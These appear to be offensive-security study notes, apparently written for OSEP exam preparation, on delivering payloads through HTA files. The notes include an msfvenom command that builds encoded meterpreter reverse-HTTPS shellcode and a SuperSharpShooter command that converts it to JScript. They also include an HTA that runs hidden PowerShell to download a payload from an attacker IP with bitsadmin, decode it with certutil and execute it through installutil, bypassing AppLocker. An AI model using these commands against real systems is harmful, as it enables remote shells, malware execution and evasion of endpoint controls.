# HTA
### SuperSharpShooter
https://github.com/SYANiDE-/SuperSharpShooter
The original sharpshooter no longer works. 

`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.xxx LPORT=443 -e x64/xor_dynamic  -b '\\x00\\x0a\\x0d' -f raw  > rawsc.bin`

NOTE: As of now supersharpshooter doesn't work with the --payload of hta. You have to do payload js and the put it in an hta with the script provided.

`./SuperSharpShooter.py --stageless --dotnetver 4 --rawscfile ~/OSEP/rawsc.bin --payload js --output test`

Generate HTA python script from @emvee_nl on discord:

generateHTA.py

python3 generateHTA.py --in test.js --out test.hta

OR just paste in the js into the .hta code manually

```
<html>
<head>
<script language="JScript">
**CONTENT OF TEST.JS HERE**
</script>
</head>
<body>
<script language="JScript">
self.close();
</script>
</body>
</html>
```

## Certutil
I first saw this method on this youtube video:
https://www.youtube.com/watch?v=63eE_DYrmvc


https://github.com/chvancooten/OSEP-Code-Snippets/tree/main/AppLocker%20Bypass%20PowerShell%20Runspace

Compile this but with the correct IP and powershell stuff. Use certutil to encode it
`certutil.exe -encode .\AppLocker.exe enc.txt`

Put enc.txt in the same folder as your ps1 payload.

Then make a cert.hta file with these contents:
(And obviously change the IP address)
```
<html>
<head>
<script language="JScript">
var shell = new ActiveXObject("WScript.Shell");
var re = shell.Run("powershell -windowstyle hidden bitsadmin /Transfer newjob3 http://192.168.45.223/installrev.txt c:\windows\tasks\enc.txt;certutil -decode c:\windows\tasks\enc.txt c:\windows\tasks\b.exe;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\windows\tasks\b.exe")
</script>
</head>
<body>
<script language="JScript">
self.close();
</script>
</body>
</html>
```